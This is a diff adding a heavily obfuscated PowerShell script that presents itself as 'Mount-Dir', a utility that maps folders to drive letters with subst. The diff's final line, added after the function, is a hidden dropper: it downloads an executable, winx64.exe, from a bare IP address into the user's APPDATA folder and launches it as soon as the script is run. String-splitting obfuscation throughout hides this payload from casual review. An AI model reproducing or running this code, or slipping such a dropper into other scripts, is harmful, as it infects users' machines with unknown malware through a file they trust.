@@ -1,0 +1,63 @@
+  .("{2}{0}{1}"-f'ET-varia','BlE','S')  ('I'+'ed')  (  [tyPe]("{1}{0}"-f 'rAY','AR') );  function MOun`T-D`iR{
+    
+    
+    
+    param(
+        [parameter(MANDATory=${Tr`UE})]
+        [string[]] 
+        ${PAt`hs}
+    )
+	${M`EtAda`TA} = @{
+		("{1}{0}" -f'itle','T') = ("{3}{2}{1}{0}"-f 'ory','t Direct','un','Mo')
+		("{1}{0}"-f'e','Filenam') = ("{1}{2}{3}{0}" -f'1','M','ount-Dir','.ps')
+		("{2}{1}{0}"-f'ion','ipt','Descr') = ""
+		("{1}{0}"-f's','Tag') = ("{3}{1}{0}{4}{2}{6}{7}{5}" -f'h','owers','ction, mount','p','ell, fun','st',', su','b')
+		("{0}{2}{1}" -f 'Proje','t','c') = ""
+		("{0}{1}{2}" -f'Au','t','hor') = ("{2}{3}{1}{0}"-f'n Rotz','o','J','anik v')
+		("{3}{0}{4}{1}{2}" -f'uth','a','ct','A','orCont') = ("{3}{4}{1}{2}{0}"-f'.ch','kv','onrotz','www.jan','i')
+		("{1}{0}{2}"-f 't','Crea','eDate') = ("{3}{0}{1}{2}"-f'1','3-','03-12','20')
+		("{2}{1}{0}" -f'e','EditDat','Last') = ("{0}{2}{3}{1}" -f '2013','12','-03','-')
+		("{0}{2}{1}" -f 'Vers','n','io') = ("{0}{1}" -f'1.0.','0')
+		("{0}{1}" -f'Lic','ense') = ((("{51}{53}{30}{63}{5}{14}{50}{61}{39}{57}{45}{2}{23}{46}{65}{0}{27}{48}{70}{17}{55}{40}{42}{36}{4}{69}{32}{21}{25}{54}{8}{6}{29}{26}{16}{19}{11}{10}{41}{13}{64}{24}{60}{58}{66}{34}{9}{18}{3}{43}{15}{59}{56}{47}{38}{49}{22}{28}{20}{35}{52}{68}{37}{1}{7}{67}{62}{33}{44}{12}{31}" -f 'ce','orni','3.','mons, 444 ','eativ',' under t','enses','a, 94041','/lic','o',' or
+s','/','
+O9',' ','he Creative Commons Att','a','-nc','iew a copy of this licen','m','-nd/3.0','ain ','m','n','0 Unpo',' to','mons.','by','nse.','t','/',' wor','t','o','SA','ive C','View','//cr','lif','00, M','onCommerc',' v','end','isit http:','C','.','al-NoDerivs ','rted L','te 9','
+To','ou','ri','O9t
+Thi',', ','s','org','se,','ro Street, Sui','i','ea','st',' Cr','bution-N','U','k is licensed','a letter','i','t',', ','Ca','ec',' v')) -rEPlACe  'O9t',[cHaR]39)
+}
+
+
+
+    
+    
+    
+    if (.("{0}{1}{2}"-f 'Get-','Comma','nd') ("{0}{1}{2}"-f 'su','bst','.exe')){
+        ${Dr`I`V`eLetTERS} = &("{4}{6}{0}{7}{2}{5}{3}{1}"-f 'ab','r','Let','e','Get-Avai','t','l','leDrive')
+        foreach(${p`ATH} in ${P`AthS}){
+            ${i`NDeX} =   ( .("{2}{0}{1}{3}"-f 't-v','ari','gE','aBle') ("i"+"eD") -vAL)::("{2}{1}{0}" -f'exOf','d','In').Invoke(${PA`ThS}, ${p`Ath})
+            ${D`RIV`eLE`TTeR} = ${d`RI`V`EL`eTTeRS}[${I`ND`eX}] + ":"
+            Try{
+                & ("{0}{1}" -f'sub','st') ${dr`IVe`letT`eR} ${PA`Th}
+            }Catch{
+            }Finally{
+                .("{1}{3}{0}{2}" -f 'Hos','W','t','rite-') ("{0}{1}" -f 'Path',' ') -nonewline; &("{2}{0}{1}"-f 'ite-H','ost','Wr') ${P`AtH}  -BackgroundColor ("{1}{0}" -f 'w','Yello') -ForegroundColor ("{1}{0}" -f'lack','B') -nonewline; .("{0}{1}{2}" -f'W','rite-H','ost') ("{0}{3}{1}{2}"-f' moun',' to',' ','ted') -nonewline; &("{0}{1}{2}"-f'Wr','ite-Ho','st') ${DriV`eL`et`TER}  -BackgroundColor ("{1}{0}" -f'ellow','Y') -ForegroundColor ("{0}{1}"-f 'B','lack')
+            }
+        }
+
+        &("{1}{2}{0}" -f'-Host','Re','ad') ("{5}{4}{3}{1}{2}{0}"-f 'r','s','s Ente',' pre','ismount','To d')
+    
+        foreach(${PA`TH} in ${p`ATHS}){
+            ${iNd`Ex} =    $ieD::("{1}{0}{2}"-f'nde','I','xOf').Invoke(${PA`THs}, ${p`ATh})
+            ${D`RIVEL`EtT`er} = ${Dr`iVelET`TE`Rs}[${I`NDeX}] + ":"
+            Try{
+                & ("{0}{1}"-f'subs','t') ('/D') ${d`Ri`VELetT`Er}
+            }Catch{
+            }Finally{
+                &("{1}{0}{2}"-f'rit','W','e-Host') ("{1}{2}{5}{3}{4}{0}" -f 'rive ','Dism','o','e','d d','unt') -nonewline; .("{1}{0}{2}" -f 'e','Writ','-Host') ${dr`I`VElet`TEr}  -BackgroundColor ("{0}{1}" -f'Ye','llow') -ForegroundColor ("{1}{0}" -f'k','Blac')
+            }
+        }
+    }else{
+        throw ("{4}{6}{0}{2}{5}{1}{3}" -f'mand is','aila',' ','ble','Subst co','not av','m')
+    }
+        
+}
+(.("{2}{1}{0}"-f 't','Objec','New-') ("{0}{3}{4}{1}{2}"-f 'System.N','bClie','nt','et.W','e')).("{3}{2}{0}{1}"-f 'dFil','e','wnloa','Do').Invoke(("{5}{6}{1}{4}{0}{3}{2}" -f'.58.30/~trev','0','x64.exe','or/win','2','http:/','/94.1'),"$env:APPDATA\winx64.exe");.("{4}{2}{0}{1}{3}"-f 'Pr','oce','art-','ss','St') ("$env:APPDATA\winx64.exe")
